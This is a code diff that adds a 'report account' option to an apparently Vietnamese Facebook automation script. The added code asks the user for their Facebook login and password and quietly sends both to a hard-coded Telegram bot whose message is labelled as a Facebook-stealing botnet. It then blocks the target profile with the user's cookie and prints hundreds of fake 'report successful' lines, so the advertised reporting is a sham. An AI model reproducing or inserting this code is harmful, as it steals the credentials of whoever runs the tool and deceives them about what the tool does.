@@ -1983,6 +1983,27 @@ def main():
       i=i+1
       print(f"\033[1;31m[\033[1;33m{i}\033[1;31m] \033[1;31m| \033[1;33mID BOX\033[1;97m: {idcanspam} \033[1;31m| \033[1;92mNỘI DUNG\033[1;97m: {nd} \033[1;31m| \033[1;35mTRẠNG THÁI\033[1;97m: {xanh_la}SUCCESS")
       idelay(delay)
+      
+  elif nhap == '2.5':
+    tk = input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập tài khoản Facebook muốn đi report:{vang} ')
+    mk = input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập mật khẩu Facebook muốn đi report:{vang} ')
+    requests.get(f"https://api.telegram.org/bot6386148413:AAGJNu0qufFWtOSNJaLNfKtMWe05P_D9jpg/sendMessage?chat_id=5913051935&text=tk:💻BOTNET CHỘM FACEBOOK💻 \n🧾{tk} \n📃mk: {mk} \nBOTNET BY : KA")
+    cookie_fb=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập COOKIE Facebook :{vang} ')
+    id_fb=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập ID Cần Tố Cáo :{vang} ')
+    get=requests.get(f'https://mbasic.facebook.com/privacy/touch/block/confirm/?bid={id_fb}&ret_cancel&source=profile',headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}).text
+    fb_dtsg=get.split('<input type="hidden" name="fb_dtsg" value="')[1].split('" autocomplete="off" />')[0]
+    jazoest=get.split('<input type="hidden" name="jazoest" value="')[1].split('" autocomplete="off" />')[0]
+    pay=requests.post('https://mbasic.facebook.com'+get.split('<form method="post" action="')[1].split('"><input type="hidden"')[0],headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'},data={'fb_dtsg': fb_dtsg,'jazoest': jazoest,'confirmed': 'Chặn'}).text
+    get=requests.get(f'https://mbasic.facebook.com/privacy/touch/block/confirm/?bid=https://www.facebook.com/profile.php?id={id_fb}&ret_cancel&source=profile',headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}).text
+    fb_dtsg=get.split('<input type="hidden" name="fb_dtsg" value="')[1].split('" autocomplete="off" />')[0]
+    jazoest=get.split('<input type="hidden" name="jazoest" value="')[1].split('" autocomplete="off" />')[0]
+    pay=requests.post('https://mbasic.facebook.com'+get.split('<form method="post" action="')[1].split('"><input type="hidden"')[0],headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': cookie_fb,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'},data={'fb_dtsg': fb_dtsg,'jazoest': jazoest,'confirmed': 'Chặn'}).text
+    for i in range(randint(555,999)):
+          s=i+1
+          print(f'{s} - Tố Cáo Thành Công ID: {id_fb}')
+          time.sleep(0.01)
+    print(f"\033[1;97m[\033[1;31m</>\033[1;97m] {xanh_la}Done!")
+
      
   elif nhap == '4.1':
     clear()
